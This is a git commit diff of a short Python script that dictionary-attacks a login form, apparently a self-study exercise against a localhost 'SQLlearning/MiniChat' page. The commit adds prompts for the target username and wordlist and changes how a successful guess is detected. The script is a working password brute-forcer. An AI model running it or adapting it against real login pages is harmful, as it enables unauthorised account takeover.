28183b78251441c11cd2b2e415a8d9f5b06e23b9
jimmy doussain <doxteurn@gmail.com>
2021-01-06 09:40:59 +0000

    Let you choose wordlist and username

--- python.py
+++ python.py
@@ -1,21 +1,24 @@
 # Import request for Post Request
 import requests
 import urllib
-import re
+
 
 # déclaration de variable
-
+username = input("Give the username : ")
+linkToWordlist = input("Give the link to the wordlist : ")
 numberOfLine = 0
+
 # Read Line
 
-f = open("mypasswordList.txt", "r")
+f = open(linkToWordlist, "r")
 
 
 # Setup Link Post request
 
 url = "http://localhost/SQLlearning/MiniChat/minichat.php"
+
 headers = {'User-Agent': 'Mozilla/5.0'}
-userPass = {'Username': 'admin', 'Password': " "}
+userPass = {'Username': username, 'Password': " "}
 session = requests.Session()
 
 # Bruteforce password one by one
@@ -25,8 +28,8 @@ for password in f:
         userPass["Password"] = word
         result = session.post(url, headers=headers, data=userPass)
         site = urllib.request.urlopen(result.url).read().decode()
-        myvar = site.find("hello")
-        if(myvar != -1):
+        myvar = site.find("Invalid")
+        if(myvar == -1):
             print("Mot de passe trouvé via le dictionnaire à la position",numberOfLine)
             print("Le mot de passe est :" , word)
             exit()
